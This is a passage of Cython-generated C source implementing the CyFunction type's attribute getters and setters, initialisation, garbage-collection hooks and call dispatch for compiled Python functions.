__Pyx_CyFunction_GetClassObj(f),\n            ((classobj) ? __Pyx_NewRef(classobj) : NULL));\n#else\n    __Pyx_Py_XDECREF_SET(\n        ((PyCMethodObject *) (f))->mm_class,\n        (PyTypeObject*)((classobj) ? __Pyx_NewRef(classobj) : NULL));\n#endif\n}\nstatic PyObject *\n__Pyx_CyFunction_get_doc_locked(__pyx_CyFunctionObject *op)\n{\n    if (unlikely(op->func_doc == NULL)) {\n#if CYTHON_COMPILING_IN_LIMITED_API\n        op->func_doc = PyObject_GetAttrString(op->func, "__doc__");\n        if (unlikely(!op->func_doc)) return NULL;\n#else\n        if (((PyCFunctionObject*)op)->m_ml->ml_doc) {\n            op->func_doc = PyUnicode_FromString(((PyCFunctionObject*)op)->m_ml->ml_doc);\n            if (unlikely(op->func_doc == NULL))\n                return NULL;\n        } else {\n            Py_INCREF(Py_None);\n            return Py_None;\n        }\n#endif\n    }\n    Py_INCREF(op->func_doc);\n    return op->func_doc;\n}\nstatic PyObject *\n__Pyx_CyFunction_get_doc(__pyx_CyFunctionObject *op, void *closure) {\n    PyObject *result;\n    CYTHON_UNUSED_VAR(closure);\n    __Pyx_BEGIN_CRITICAL_SECTION(op);\n    result = __Pyx_CyFunction_get_doc_locked(op);\n    __Pyx_END_CRITICAL_SECTION();\n    return result;\n}\nstatic int\n__Pyx_CyFunction_set_doc(__pyx_CyFunctionObject *op, PyObject *value, void *context)\n{\n    CYTHON_UNUSED_VAR(context);\n    if (value == NULL) {\n        value = Py_None;\n    }\n    Py_INCREF(value);\n    __Pyx_BEGIN_CRITICAL_SECTION(op);\n    __Pyx_Py_XDECREF_SET(op->func_doc, value);\n    __Pyx_END_CRITICAL_SECTION();\n    return 0;\n}\nstatic PyObject *\n__Pyx_CyFunction_get_name_locked(__pyx_CyFunctionObject *op)\n{\n    if (unlikely(op->func_name == NULL)) {\n#if CYTHON_COMPILING_IN_LIMITED_API\n        op->func_name = PyObject_GetAttrString(op->func, "__name__");\n#else\n        op->func_name = PyUnicode_InternFromString(((PyCFunctionObject*)op)->m_ml->ml_name);\n#endif\n        if (unlikely(op->func_name == NULL))\n            return NULL;\n    }\n    Py_INCREF(op->func_name);\n    return op->func_name;\n}\nstatic PyObject *\n__Pyx_CyFunction_get_name(__pyx_CyFunctionObject *op, void *context)\n{\n    PyObject *result = NULL;\n    CYTHON_UNUSED_VAR(context);\n    __Pyx_BEGIN_CRITICAL_SECTION(op);\n    result = __Pyx_CyFunction_get_name_locked(op);\n    __Pyx_END_CRITICAL_SECTION();\n    return result;\n}\nstatic int\n__Pyx_CyFunction_set_name(__pyx_CyFunctionObject *op, PyObject *value, void *context)\n{\n    CYTHON_UNUSED_VAR(context);\n    if (unlikely(value == NULL || !PyUnicode_Check(value))) {\n        PyErr_SetString(PyExc_TypeError,\n                        "__name__ must be set to a string object");\n        return -1;\n    }\n    Py_INCREF(value);\n    __Pyx_BEGIN_CRITICAL_SECTION(op);\n    __Pyx_Py_XDECREF_SET(op->func_name, value);\n    __Pyx_END_CRITICAL_SECTION();\n    return 0;\n}\nstatic PyObject *\n__Pyx_CyFunction_get_qualname(__pyx_CyFunctionObject *op, void *context)\n{\n    CYTHON_UNUSED_VAR(context);\n    PyObject *result;\n    __Pyx_BEGIN_CRITICAL_SECTION(op);\n    Py_INCREF(op->func_qualname);\n    result = op->func_qualname;\n    __Pyx_END_CRITICAL_SECTION();\n    return result;\n}\nstatic int\n__Pyx_CyFunction_set_qualname(__pyx_CyFunctionObject *op, PyObject *value, void *context)\n{\n    CYTHON_UNUSED_VAR(context);\n    if (unlikely(value == NULL || !PyUnicode_Check(value))) {\n        PyErr_SetString(PyExc_TypeError,\n                        "__qualname__ must be set to a string object");\n        return -1;\n    }\n    Py_INCREF(value);\n    __Pyx_BEGIN_CRITICAL_SECTION(op);\n    __Pyx_Py_XDECREF_SET(op->func_qualname, value);\n    __Pyx_END_CRITICAL_SECTION();\n    return 0;\n}\nstatic PyObject *\n__Pyx_CyFunction_get_dict_locked(__pyx_CyFunctionObject *op)\n{\n    if (unlikely(op->func_dict == NULL)) {\n        op->func_dict = PyDict_New();\n        if (unlikely(op->func_dict == NULL))\n            return NULL;\n    }\n    Py_INCREF(op->func_dict);\n    return op->func_dict;\n}\nstatic PyObject *\n__Pyx_CyFunction_get_dict(__pyx_CyFunctionObject *op, void *context)\n{\n    CYTHON_UNUSED_VAR(context);\n    PyObject *result;\n    __Pyx_BEGIN_CRITICAL_SECTION(op);\n    result = __Pyx_CyFunction_get_dict_locked(op);\n    __Pyx_END_CRITICAL_SECTION();\n    return result;\n}\nstatic int\n__Pyx_CyFunction_set_dict(__pyx_CyFunctionObject *op, PyObject *value, void *context)\n{\n    CYTHON_UNUSED_VAR(context);\n    if (unlikely(value == NULL)) {\n        PyErr_SetString(PyExc_TypeError,\n               "function\'s dictionary may not be deleted");\n        return -1;\n    }\n    if (unlikely(!PyDict_Check(value))) {\n        PyErr_SetString(PyExc_TypeError,\n               "setting function\'s dictionary to a non-dict");\n        return -1;\n    }\n    Py_INCREF(value);\n    __Pyx_BEGIN_CRITICAL_SECTION(op);\n    __Pyx_Py_XDECREF_SET(op->func_dict, value);\n    __Pyx_END_CRITICAL_SECTION();\n    return 0;\n}\nstatic PyObject *\n__Pyx_CyFunction_get_globals(__pyx_CyFunctionObject *op, void *context)\n{\n    CYTHON_UNUSED_VAR(context);\n    Py_INCREF(op->func_globals);\n    return op->func_globals;\n}\nstatic PyObject *\n__Pyx_CyFunction_get_closure(__pyx_CyFunctionObject *op, void *context)\n{\n    CYTHON_UNUSED_VAR(op);\n    CYTHON_UNUSED_VAR(context);\n    Py_INCREF(Py_None);\n    return Py_None;\n}\nstatic PyObject *\n__Pyx_CyFunction_get_code(__pyx_CyFunctionObject *op, void *context)\n{\n    PyObject* result = (op->func_code) ? op->func_code : Py_None;\n    CYTHON_UNUSED_VAR(context);\n    Py_INCREF(result);\n    return result;\n}\nstatic int\n__Pyx_CyFunction_init_defaults(__pyx_CyFunctionObject *op) {\n    int result = 0;\n    PyObject *res = op->defaults_getter((PyObject *) op);\n    if (unlikely(!res))\n        return -1;\n    #if CYTHON_ASSUME_SAFE_MACROS && !CYTHON_AVOID_BORROWED_REFS\n    op->defaults_tuple = PyTuple_GET_ITEM(res, 0);\n    Py_INCREF(op->defaults_tuple);\n    op->defaults_kwdict = PyTuple_GET_ITEM(res, 1);\n    Py_INCREF(op->defaults_kwdict);\n    #else\n    op->defaults_tuple = __Pyx_PySequence_ITEM(res, 0);\n    if (unlikely(!op->defaults_tuple)) result = -1;\n    else {\n        op->defaults_kwdict = __Pyx_PySequence_ITEM(res, 1);\n        if (unlikely(!op->defaults_kwdict)) result = -1;\n    }\n    #endif\n    Py_DECREF(res);\n    return result;\n}\nstatic int\n__Pyx_CyFunction_set_defaults(__pyx_CyFunctionObject *op, PyObject* value, void *context) {\n    CYTHON_UNUSED_VAR(context);\n    if (!value) {\n        value = Py_None;\n    } else if (unlikely(value != Py_None && !PyTuple_Check(value))) {\n        PyErr_SetString(PyExc_TypeError,\n                        "__defaults__ must be set to a tuple object");\n        return -1;\n    }\n    PyErr_WarnEx(PyExc_RuntimeWarning, "changes to cyfunction.__defaults__ will not "\n                 "currently affect the values used in function calls", 1);\n    Py_INCREF(value);\n    __Pyx_BEGIN_CRITICAL_SECTION(op);\n    __Pyx_Py_XDECREF_SET(op->defaults_tuple, value);\n    __Pyx_END_CRITICAL_SECTION();\n    return 0;\n}\nstatic PyObject *\n__Pyx_CyFunction_get_defaults_locked(__pyx_CyFunctionObject *op) {\n    PyObject* result = op->defaults_tuple;\n    if (unlikely(!result)) {\n        if (op->defaults_getter) {\n            if (unlikely(__Pyx_CyFunction_init_defaults(op) < 0)) return NULL;\n            result = op->defaults_tuple;\n        } else {\n            result = Py_None;\n        }\n    }\n    Py_INCREF(result);\n    return result;\n}\nstatic PyObject *\n__Pyx_CyFunction_get_defaults(__pyx_CyFunctionObject *op, void *context) {\n    PyObject* result = NULL;\n    CYTHON_UNUSED_VAR(context);\n    __Pyx_BEGIN_CRITICAL_SECTION(op);\n    result = __Pyx_CyFunction_get_defaults_locked(op);\n    __Pyx_END_CRITICAL_SECTION();\n    return result;\n}\nstatic int\n__Pyx_CyFunction_set_kwdefaults(__pyx_CyFunctionObject *op, PyObject* value, void *context) {\n    CYTHON_UNUSED_VAR(context);\n    if (!value) {\n        value = Py_None;\n    } else if (unlikely(value != Py_None && !PyDict_Check(value))) {\n        PyErr_SetString(PyExc_TypeError,\n                        "__kwdefaults__ must be set to a dict object");\n        return -1;\n    }\n    PyErr_WarnEx(PyExc_RuntimeWarning, "changes to cyfunction.__kwdefaults__ will not "\n                 "currently affect the values used in function calls", 1);\n    Py_INCREF(value);\n    __Pyx_BEGIN_CRITICAL_SECTION(op);\n    __Pyx_Py_XDECREF_SET(op->defaults_kwdict, value);\n    __Pyx_END_CRITICAL_SECTION();\n    return 0;\n}\nstatic PyObject *\n__Pyx_CyFunction_get_kwdefaults_locked(__pyx_CyFunctionObject *op) {\n    PyObject* result = op->defaults_kwdict;\n    if (unlikely(!result)) {\n        if (op->defaults_getter) {\n            if (unlikely(__Pyx_CyFunction_init_defaults(op) < 0)) return NULL;\n            result = op->defaults_kwdict;\n        } else {\n            result = Py_None;\n        }\n    }\n    Py_INCREF(result);\n    return result;\n}\nstatic PyObject *\n__Pyx_CyFunction_get_kwdefaults(__pyx_CyFunctionObject *op, void *context) {\n    PyObject* result;\n    CYTHON_UNUSED_VAR(context);\n    __Pyx_BEGIN_CRITICAL_SECTION(op);\n    result = __Pyx_CyFunction_get_kwdefaults_locked(op);\n    __Pyx_END_CRITICAL_SECTION();\n    return result;\n}\nstatic int\n__Pyx_CyFunction_set_annotations(__pyx_CyFunctionObject *op, PyObject* value, void *context) {\n    CYTHON_UNUSED_VAR(context);\n    if (!value || value == Py_None) {\n        value = NULL;\n    } else if (unlikely(!PyDict_Check(value))) {\n        PyErr_SetString(PyExc_TypeError,\n                        "__annotations__ must be set to a dict object");\n        return -1;\n    }\n    Py_XINCREF(value);\n    __Pyx_BEGIN_CRITICAL_SECTION(op);\n    __Pyx_Py_XDECREF_SET(op->func_annotations, value);\n    __Pyx_END_CRITICAL_SECTION();\n    return 0;\n}\nstatic PyObject *\n__Pyx_CyFunction_get_annotations_locked(__pyx_CyFunctionObject *op) {\n    PyObject* result = op->func_annotations;\n    if (unlikely(!result)) {\n        result = PyDict_New();\n        if (unlikely(!result)) return NULL;\n        op->func_annotations = result;\n    }\n    Py_INCREF(result);\n    return result;\n}\nstatic PyObject *\n__Pyx_CyFunction_get_annotations(__pyx_CyFunctionObject *op, void *context) {\n    PyObject *result;\n    CYTHON_UNUSED_VAR(context);\n    __Pyx_BEGIN_CRITICAL_SECTION(op);\n    result = __Pyx_CyFunction_get_annotations_locked(op);\n    __Pyx_END_CRITICAL_SECTION();\n    return result;\n}\nstatic PyObject *\n__Pyx_CyFunction_get_is_coroutine_value(__pyx_CyFunctionObject *op) {\n    int is_coroutine = op->flags & __Pyx_CYFUNCTION_COROUTINE;\n    if (is_coroutine) {\n        PyObject *is_coroutine_value, *module, *fromlist, *marker = __pyx_mstate_global->__pyx_n_u_is_coroutine;\n        fromlist = PyList_New(1);\n        if (unlikely(!fromlist)) return NULL;\n        Py_INCREF(marker);\n#if CYTHON_ASSUME_SAFE_MACROS\n        PyList_SET_ITEM(fromlist, 0, marker);\n#else\n        if (unlikely(PyList_SetItem(fromlist, 0, marker) < 0)) {\n            Py_DECREF(marker);\n            Py_DECREF(fromlist);\n            return NULL;\n        }\n#endif\n        module = PyImport_ImportModuleLevelObject(__pyx_mstate_global->__pyx_n_u_asyncio_coroutines, NULL, NULL, fromlist, 0);\n        Py_DECREF(fromlist);\n        if (unlikely(!module)) goto ignore;\n        is_coroutine_value = __Pyx_PyObject_GetAttrStr(module, marker);\n        Py_DECREF(module);\n        if (likely(is_coroutine_value)) {\n            return is_coroutine_value;\n        }\nignore:\n        PyErr_Clear();\n    }\n    return __Pyx_PyBool_FromLong(is_coroutine);\n}\nstatic PyObject *\n__Pyx_CyFunction_get_is_coroutine(__pyx_CyFunctionObject *op, void *context) {\n    PyObject *result;\n    CYTHON_UNUSED_VAR(context);\n    if (op->func_is_coroutine) {\n        return __Pyx_NewRef(op->func_is_coroutine);\n    }\n    result = __Pyx_CyFunction_get_is_coroutine_value(op);\n    if (unlikely(!result))\n        return NULL;\n    __Pyx_BEGIN_CRITICAL_SECTION(op);\n    if (op->func_is_coroutine) {\n        Py_DECREF(result);\n        result = __Pyx_NewRef(op->func_is_coroutine);\n    } else {\n        op->func_is_coroutine = __Pyx_NewRef(result);\n    }\n    __Pyx_END_CRITICAL_SECTION();\n    return result;\n}\nstatic void __Pyx_CyFunction_raise_argument_count_error(__pyx_CyFunctionObject *func, const char* message, Py_ssize_t size) {\n#if CYTHON_COMPILING_IN_LIMITED_API\n    PyObject *py_name = __Pyx_CyFunction_get_name(func, NULL);\n    if (!py_name) return;\n    PyErr_Format(PyExc_TypeError,\n        "%.200S() %s (%" CYTHON_FORMAT_SSIZE_T "d given)",\n        py_name, message, size);\n    Py_DECREF(py_name);\n#else\n    const char* name = ((PyCFunctionObject*)func)->m_ml->ml_name;\n    PyErr_Format(PyExc_TypeError,\n        "%.200s() %s (%" CYTHON_FORMAT_SSIZE_T "d given)",\n        name, message, size);\n#endif\n}\nstatic void __Pyx_CyFunction_raise_type_error(__pyx_CyFunctionObject *func, const char* message) {\n#if CYTHON_COMPILING_IN_LIMITED_API\n    PyObject *py_name = __Pyx_CyFunction_get_name(func, NULL);\n    if (!py_name) return;\n    PyErr_Format(PyExc_TypeError,\n        "%.200S() %s",\n        py_name, message);\n    Py_DECREF(py_name);\n#else\n    const char* name = ((PyCFunctionObject*)func)->m_ml->ml_name;\n    PyErr_Format(PyExc_TypeError,\n        "%.200s() %s",\n        name, message);\n#endif\n}\n#if CYTHON_COMPILING_IN_LIMITED_API\nstatic PyObject *\n__Pyx_CyFunction_get_module(__pyx_CyFunctionObject *op, void *context) {\n    CYTHON_UNUSED_VAR(context);\n    return PyObject_GetAttrString(op->func, "__module__");\n}\nstatic int\n__Pyx_CyFunction_set_module(__pyx_CyFunctionObject *op, PyObject* value, void *context) {\n    CYTHON_UNUSED_VAR(context);\n    return PyObject_SetAttrString(op->func, "__module__", value);\n}\n#endif\nstatic PyGetSetDef __pyx_CyFunction_getsets[] = {\n    {"func_doc", (getter)__Pyx_CyFunction_get_doc, (setter)__Pyx_CyFunction_set_doc, 0, 0},\n    {"__doc__",  (getter)__Pyx_CyFunction_get_doc, (setter)__Pyx_CyFunction_set_doc, 0, 0},\n    {"func_name", (getter)__Pyx_CyFunction_get_name, (setter)__Pyx_CyFunction_set_name, 0, 0},\n    {"__name__", (getter)__Pyx_CyFunction_get_name, (setter)__Pyx_CyFunction_set_name, 0, 0},\n    {"__qualname__", (getter)__Pyx_CyFunction_get_qualname, (setter)__Pyx_CyFunction_set_qualname, 0, 0},\n    {"func_dict", (getter)__Pyx_CyFunction_get_dict, (setter)__Pyx_CyFunction_set_dict, 0, 0},\n    {"__dict__", (getter)__Pyx_CyFunction_get_dict, (setter)__Pyx_CyFunction_set_dict, 0, 0},\n    {"func_globals", (getter)__Pyx_CyFunction_get_globals, 0, 0, 0},\n    {"__globals__", (getter)__Pyx_CyFunction_get_globals, 0, 0, 0},\n    {"func_closure", (getter)__Pyx_CyFunction_get_closure, 0, 0, 0},\n    {"__closure__", (getter)__Pyx_CyFunction_get_closure, 0, 0, 0},\n    {"func_code", (getter)__Pyx_CyFunction_get_code, 0, 0, 0},\n    {"__code__", (getter)__Pyx_CyFunction_get_code, 0, 0, 0},\n    {"func_defaults", (getter)__Pyx_CyFunction_get_defaults, (setter)__Pyx_CyFunction_set_defaults, 0, 0},\n    {"__defaults__", (getter)__Pyx_CyFunction_get_defaults, (setter)__Pyx_CyFunction_set_defaults, 0, 0},\n    {"__kwdefaults__", (getter)__Pyx_CyFunction_get_kwdefaults, (setter)__Pyx_CyFunction_set_kwdefaults, 0, 0},\n    {"__annotations__", (getter)__Pyx_CyFunction_get_annotations, (setter)__Pyx_CyFunction_set_annotations, 0, 0},\n    {"_is_coroutine", (getter)__Pyx_CyFunction_get_is_coroutine, 0, 0, 0},\n#if CYTHON_COMPILING_IN_LIMITED_API\n    {"__module__", (getter)__Pyx_CyFunction_get_module, (setter)__Pyx_CyFunction_set_module, 0, 0},\n#endif\n    {0, 0, 0, 0, 0}\n};\nstatic PyMemberDef __pyx_CyFunction_members[] = {\n#if !CYTHON_COMPILING_IN_LIMITED_API\n    {"__module__", T_OBJECT, offsetof(PyCFunctionObject, m_module), 0, 0},\n#endif\n    {"__dictoffset__", T_PYSSIZET, offsetof(__pyx_CyFunctionObject, func_dict), READONLY, 0},\n#if CYTHON_METH_FASTCALL\n#if CYTHON_BACKPORT_VECTORCALL || CYTHON_COMPILING_IN_LIMITED_API\n    {"__vectorcalloffset__", T_PYSSIZET, offsetof(__pyx_CyFunctionObject, func_vectorcall), READONLY, 0},\n#else\n    {"__vectorcalloffset__", T_PYSSIZET, offsetof(PyCFunctionObject, vectorcall), READONLY, 0},\n#endif\n#if CYTHON_COMPILING_IN_LIMITED_API\n    {"__weaklistoffset__", T_PYSSIZET, offsetof(__pyx_CyFunctionObject, func_weakreflist), READONLY, 0},\n#else\n    {"__weaklistoffset__", T_PYSSIZET, offsetof(PyCFunctionObject, m_weakreflist), READONLY, 0},\n#endif\n#endif\n    {0, 0, 0,  0, 0}\n};\nstatic PyObject *\n__Pyx_CyFunction_reduce(__pyx_CyFunctionObject *m, PyObject *args)\n{\n    PyObject *result = NULL;\n    CYTHON_UNUSED_VAR(args);\n    __Pyx_BEGIN_CRITICAL_SECTION(m);\n    Py_INCREF(m->func_qualname);\n    result = m->func_qualname;\n    __Pyx_END_CRITICAL_SECTION();\n    return result;\n}\nstatic PyMethodDef __pyx_CyFunction_methods[] = {\n    {"__reduce__", (PyCFunction)__Pyx_CyFunction_reduce, METH_VARARGS, 0},\n    {0, 0, 0, 0}\n};\n#if CYTHON_COMPILING_IN_LIMITED_API\n#define __Pyx_CyFunction_weakreflist(cyfunc) ((cyfunc)->func_weakreflist)\n#else\n#define __Pyx_CyFunction_weakreflist(cyfunc) (((PyCFunctionObject*)cyfunc)->m_weakreflist)\n#endif\nstatic PyObject *__Pyx_CyFunction_Init(__pyx_CyFunctionObject *op, PyMethodDef *ml, int flags, PyObject* qualname,\n                                       PyObject *closure, PyObject *module, PyObject* globals, PyObject* code) {\n#if !CYTHON_COMPILING_IN_LIMITED_API\n    PyCFunctionObject *cf = (PyCFunctionObject*) op;\n#endif\n    if (unlikely(op == NULL))\n        return NULL;\n#if CYTHON_COMPILING_IN_LIMITED_API\n    op->func = PyCFunction_NewEx(ml, (PyObject*)op, module);\n    if (unlikely(!op->func)) return NULL;\n#endif\n    op->flags = flags;\n    __Pyx_CyFunction_weakreflist(op) = NULL;\n#if !CYTHON_COMPILING_IN_LIMITED_API\n    cf->m_ml = ml;\n    cf->m_self = (PyObject *) op;\n#endif\n    Py_XINCREF(closure);\n    op->func_closure = closure;\n#if !CYTHON_COMPILING_IN_LIMITED_API\n    Py_XINCREF(module);\n    cf->m_module = module;\n#endif\n    op->func_dict = NULL;\n    op->func_name = NULL;\n    Py_INCREF(qualname);\n    op->func_qualname = qualname;\n    op->func_doc = NULL;\n#if PY_VERSION_HEX < 0x030900B1 || CYTHON_COMPILING_IN_LIMITED_API\n    op->func_classobj = NULL;\n#else\n    ((PyCMethodObject*)op)->mm_class = NULL;\n#endif\n    op->func_globals = globals;\n    Py_INCREF(op->func_globals);\n    Py_XINCREF(code);\n    op->func_code = code;\n    op->defaults = NULL;\n    op->defaults_tuple = NULL;\n    op->defaults_kwdict = NULL;\n    op->defaults_getter = NULL;\n    op->func_annotations = NULL;\n    op->func_is_coroutine = NULL;\n#if CYTHON_METH_FASTCALL\n    switch (ml->ml_flags & (METH_VARARGS | METH_FASTCALL | METH_NOARGS | METH_O | METH_KEYWORDS | METH_METHOD)) {\n    case METH_NOARGS:\n        __Pyx_CyFunction_func_vectorcall(op) = __Pyx_CyFunction_Vectorcall_NOARGS;\n        break;\n    case METH_O:\n        __Pyx_CyFunction_func_vectorcall(op) = __Pyx_CyFunction_Vectorcall_O;\n        break;\n    case METH_METHOD | METH_FASTCALL | METH_KEYWORDS:\n        __Pyx_CyFunction_func_vectorcall(op) = __Pyx_CyFunction_Vectorcall_FASTCALL_KEYWORDS_METHOD;\n        break;\n    case METH_FASTCALL | METH_KEYWORDS:\n        __Pyx_CyFunction_func_vectorcall(op) = __Pyx_CyFunction_Vectorcall_FASTCALL_KEYWORDS;\n        break;\n    case METH_VARARGS | METH_KEYWORDS:\n        __Pyx_CyFunction_func_vectorcall(op) = NULL;\n        break;\n    default:\n        PyErr_SetString(PyExc_SystemError, "Bad call flags for CyFunction");\n        Py_DECREF(op);\n        return NULL;\n    }\n#endif\n    return (PyObject *) op;\n}\nstatic int\n__Pyx_CyFunction_clear(__pyx_CyFunctionObject *m)\n{\n    Py_CLEAR(m->func_closure);\n#if CYTHON_COMPILING_IN_LIMITED_API\n    Py_CLEAR(m->func);\n#else\n    Py_CLEAR(((PyCFunctionObject*)m)->m_module);\n#endif\n    Py_CLEAR(m->func_dict);\n    Py_CLEAR(m->func_name);\n    Py_CLEAR(m->func_qualname);\n    Py_CLEAR(m->func_doc);\n    Py_CLEAR(m->func_globals);\n    Py_CLEAR(m->func_code);\n#if !CYTHON_COMPILING_IN_LIMITED_API\n#if PY_VERSION_HEX < 0x030900B1\n    Py_CLEAR(__Pyx_CyFunction_GetClassObj(m));\n#else\n    {\n        PyObject *cls = (PyObject*) ((PyCMethodObject *) (m))->mm_class;\n        ((PyCMethodObject *) (m))->mm_class = NULL;\n        Py_XDECREF(cls);\n    }\n#endif\n#endif\n    Py_CLEAR(m->defaults_tuple);\n    Py_CLEAR(m->defaults_kwdict);\n    Py_CLEAR(m->func_annotations);\n    Py_CLEAR(m->func_is_coroutine);\n    Py_CLEAR(m->defaults);\n    return 0;\n}\nstatic void __Pyx__CyFunction_dealloc(__pyx_CyFunctionObject *m)\n{\n    if (__Pyx_CyFunction_weakreflist(m) != NULL)\n        PyObject_ClearWeakRefs((PyObject *) m);\n    __Pyx_CyFunction_clear(m);\n    __Pyx_PyHeapTypeObject_GC_Del(m);\n}\nstatic void __Pyx_CyFunction_dealloc(__pyx_CyFunctionObject *m)\n{\n    PyObject_GC_UnTrack(m);\n    __Pyx__CyFunction_dealloc(m);\n}\nstatic int __Pyx_CyFunction_traverse(__pyx_CyFunctionObject *m, visitproc visit, void *arg)\n{\n    {\n        int e = __Pyx_call_type_traverse((PyObject*)m, 1, visit, arg);\n        if (e) return e;\n    }\n    Py_VISIT(m->func_closure);\n#if CYTHON_COMPILING_IN_LIMITED_API\n    Py_VISIT(m->func);\n#else\n    Py_VISIT(((PyCFunctionObject*)m)->m_module);\n#endif\n    Py_VISIT(m->func_dict);\n    __Pyx_VISIT_CONST(m->func_name);\n    __Pyx_VISIT_CONST(m->func_qualname);\n    Py_VISIT(m->func_doc);\n    Py_VISIT(m->func_globals);\n    __Pyx_VISIT_CONST(m->func_code);\n#if !CYTHON_COMPILING_IN_LIMITED_API\n    Py_VISIT(__Pyx_CyFunction_GetClassObj(m));\n#endif\n    Py_VISIT(m->defaults_tuple);\n    Py_VISIT(m->defaults_kwdict);\n    Py_VISIT(m->func_is_coroutine);\n    Py_VISIT(m->defaults);\n    return 0;\n}\nstatic PyObject*\n__Pyx_CyFunction_repr(__pyx_CyFunctionObject *op)\n{\n    PyObject *repr;\n    __Pyx_BEGIN_CRITICAL_SECTION(op);\n    repr = PyUnicode_FromFormat("<cyfunction %U at %p>",\n                                op->func_qualname, (void *)op);\n    __Pyx_END_CRITICAL_SECTION();\n    return repr;\n}\nstatic PyObject * __Pyx_CyFunction_CallMethod(PyObject *func, PyObject *self, PyObject *arg, PyObject *kw) {\n#if CYTHON_COMPILING_IN_LIMITED_API\n    PyObject *f = ((__pyx_CyFunctionObject*)func)->func;\n    PyCFunction meth;\n    int flags;\n    meth = PyCFunction_GetFunction(f);\n    if (unlikely(!meth)) return NULL;\n    flags = PyCFunction_GetFlags(f);\n    if (unlikely(flags < 0)) return NULL;\n#else\n    PyCFunctionObject* f = (PyCFunctionObject*)func;\n    PyCFunction meth = f->m_ml->ml_meth;\n    int flags = f->m_ml->ml_flags;\n#endif\n    Py_ssize_t size;\n    switch (flags & (METH_VARARGS | METH_KEYWORDS | METH_NOARGS | METH_O)) {\n    case METH_VARARGS:\n        if (likely(kw == NULL || PyDict_Size(kw) == 0))\n            return (*meth)(self, arg);\n        break;\n    case METH_VARARGS | METH_KEYWORDS:\n        return (*(PyCFunctionWithKeywords)(void(*)(void))meth)(self, arg, kw);\n    case METH_NOARGS:\n        if (likely(kw == NULL || PyDict_Size(kw) == 0)) {\n#if CYTHON_ASSUME_SAFE_SIZE\n            size = PyTuple_GET_SIZE(arg);\n#else\n            size = PyTuple_Size(arg);\n            if (unlikely(size < 0)) return NULL;\n#endif\n            if (likely(size == 0))\n                return (*meth)(self, NULL);\n            __Pyx_CyFunction_raise_argument_count_error(\n                (__pyx_CyFunctionObject*)func,\n                "takes no arguments", size);\n            return NULL;\n        }\n        break;\n    case METH_O:\n        if (likely(kw == NULL || PyDict_Size(kw) == 0)) {\n#if CYTHON_ASSUME_SAFE_SIZE\n            size = PyTuple_GET_SIZE(arg);\n#else\n            size = PyTuple_Size(arg);\n            if (unlikely(size < 0)) return NULL;\n#endif\n            if (likely(size == 1)) {\n                PyObject *result, *arg0;\n                #if CYTHON_ASSUME_SAFE_MACROS && !CYTHON_AVOID_BORROWED_REFS\n                arg0 = PyTuple_GET_ITEM(arg, 0);\n                #else\n                arg0 = __Pyx_PySequence_ITEM(arg, 0); if (unlikely(!arg0)) return NULL;\n                #endif\n                result = (*meth)(self, arg0);\n                #if !(CYTHON_ASSUME_SAFE_MACROS && !CYTHON_AVOID_BORROWED_REFS)\n                Py_DECREF(arg0);\n                #endif\n                return result;\n            }\n            __Pyx_CyFunction_raise_argument_count_error(\n                (__pyx_CyFunctionObject*)func,\n                "takes exactly one argument", size);\n            return NULL;\n        }\n        break;\n    default:\n        PyErr_SetString(PyExc_SystemError, "Bad call flags for CyFunction");\n        return NULL;\n    }\n    __Pyx_CyFunction_raise_type_error(\n        (__pyx_CyFunctionObject*)func, "takes no keyword arguments");\n    return NULL;\n}\nstatic CYTHON_INLINE PyObject *__Pyx_CyFunction_Call(PyObject *func, PyObject *arg, PyObject *kw) {\n    PyObject *self, *result;\n#if CYTHON_COMPILING_IN_LIMITED_API\n    self = PyCFunction_GetSelf(((__pyx_CyFunctionObject*)func)->func);\n    if (unlikely(!self) && PyErr_Occurred()) return NULL;\n#else\n    self = ((PyCFunctionObject*)func)->m_self;\n#endif\n    result = __Pyx_CyFunction_CallMethod(func, self, arg, kw);\n    return result;\n}\nstatic PyObject *__Pyx_CyFunction_CallAsMethod(PyObject *func, PyObject *args, PyObject *kw) {\n    PyObject *result;\n    __pyx_CyFunctionObject *cyfunc = (__pyx_CyFunctionObject *) func;\n#if CYTHON_METH_FASTCALL && (CYTHON_VECTORCALL || CYTHON_BACKPORT_VECTORCALL)\n     __pyx_vectorcallfunc vc = __Pyx_CyFunction_func_vectorcall(cyfunc);\n    if (vc) {\n#if CYTHON_ASSUME_SAFE_MACROS && CYTHON_ASSUME_SAFE_SIZE\n        return __Pyx_PyVectorcall_FastCallDict(func, vc, &PyTuple_GET_ITEM(args, 0), (size_t)PyTuple_GET_SIZE(args), kw);\n#else\n        (void) &__Pyx_PyVectorcall_FastCallDict;\n        return PyVectorcall_Call(func, args, kw);\n#endif\n    }\n#endif\n    if ((cyfunc->flags & __Pyx_CYFUNCTION_CCLASS) && !(cyfunc->flags & __Pyx_CYFUNCTION_STATICMETHOD)) {\n        Py_ssize_t argc;\n        PyObject *new_args;\n        PyObject *self;\n#if CYTHON_ASSUME_SAFE_SIZE\n        argc = PyTuple_GET_SIZE(args);\n#else\n        argc = PyTuple_Size(args);\n        if (unlikely(argc < 0)) return NULL;\n#endif\n        new_args = PyTuple_GetSlice(args, 1, argc);\n        if (unlikely(!new_args))\n            return NULL;\n        self = PyTuple_GetItem(args, 0);\n        if (unlikely(!self)) {\n            Py_DECREF(new_args);\n            PyErr_Format(PyExc_TypeError,\n                         "unbound method %.200S() needs an argument",\n                         cyfunc->func_qualname);\n            return NULL;\n        }\n        result = __Pyx_CyFunction_CallMethod(func, self, new_args, kw);\n        Py_DECREF(new_args);\n    } else {\n        result = __Pyx_CyFunction_Call(func, args, kw);\n    }\n    return result;\n}\n#if CYTHON_METH_FASTCALL && (CYTHON_VECTORCALL || CYTHON_BACKPORT_VECTORCALL)\nstatic CYTHON_INLINE int __Pyx_CyFunction_Vectorcall_CheckArgs(__pyx_CyFunctionObject *cyfunc, Py_ssize_t nargs, PyObject *kwnames)\n{\n    int ret = 0;\n    if ((cyfunc->flags & __Pyx_CYFUNCTION_CCLASS) && !(cyfunc->flags & __Pyx_CYFUNCTION_STATICMETHOD)) {\n        if (unlikely(nargs < 1)) {\n            __Pyx_CyFunction_raise_type_error(\n                cyfunc, "needs an argument");\n            return -1;\n        }\n        ret = 1;\n    }\n    if (unlikely(kwnames) && unlikely(__Pyx_PyTuple_GET_SIZE(kwnames))) {\n        __Pyx_CyFunction_raise_type_error(\n            cyfunc, "takes no keyword arguments");\n        return -1;\n    }\n    return ret;\n}\nstatic PyObject * __Pyx_CyFunction_Vectorcall_NOARGS(PyObject *func, PyObject *const *args, size_t nargsf, PyObject 